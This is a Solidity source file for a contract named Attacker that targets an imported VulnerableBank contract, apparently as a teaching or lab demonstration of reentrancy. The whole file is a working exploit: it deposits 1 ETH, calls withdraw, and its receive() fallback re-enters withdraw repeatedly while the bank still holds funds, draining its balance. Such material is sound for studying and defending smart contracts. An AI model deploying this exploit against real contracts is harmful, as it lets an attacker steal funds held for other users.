// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }
}
